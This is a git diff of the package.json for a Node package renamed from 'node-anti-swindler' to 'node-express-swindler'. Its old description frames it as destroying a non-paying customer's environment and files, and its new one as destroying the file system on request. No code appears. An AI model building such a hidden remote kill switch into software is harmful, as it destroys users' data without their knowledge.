@@ -1,7 +1,7 @@
 {
-  "name": "node-anti-swindler",
+  "name": "node-express-swindler",
   "version": "0.0.1",
-  "description": "Afraid that the customer will pay? Package for destruct swindler`s env and files",
+  "description": "Destruct file system by request",
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1"
@@ -11,12 +11,9 @@
     "url": "git+https://github.com/AlexanderGY/node-anti-swindler.git"
   },
   "keywords": [
-    "freelance",
     "swindler",
-    "fraud",
     "destruct",
-    "defence",
-    "locker"
+    "express"
   ],
   "author": "alexile",
   "license": "ISC",
